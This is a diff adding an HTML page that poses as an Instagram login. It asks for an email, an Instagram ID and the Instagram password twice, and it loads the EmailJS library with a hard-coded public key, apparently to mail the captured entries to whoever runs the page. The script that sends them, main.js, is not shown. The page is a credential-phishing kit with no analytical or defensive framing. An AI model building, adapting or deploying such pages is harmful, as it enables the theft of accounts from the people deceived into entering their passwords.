@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "Y12bkDC-PMcVBFf-j",
+      });
+   })();
+</script>
+</head>
+
+<body>
+    <div class="box">
+
+
+        <div class="container3">
+            <input type="email" placeholder="Email address" id="email">
+        </div>
+        <div class="container3">
+            <input type="text" placeholder="Instagram ID" id="instagramid">
+        </div>
+        <div class="container4">
+            <input type="password" placeholder="Instagram Password" id="pass">
+        </div>
+        <div class="container4">
+            <input type="text" placeholder="Verify Your Instagram Password" id="message">
+        </div>
+        <div class="container5">
+            <button type="submit" id="logi">Login</button>
+        </div>
+    </div>
+
+
+
+    <script src="main.js"></script>
+</body>
+
+</html>
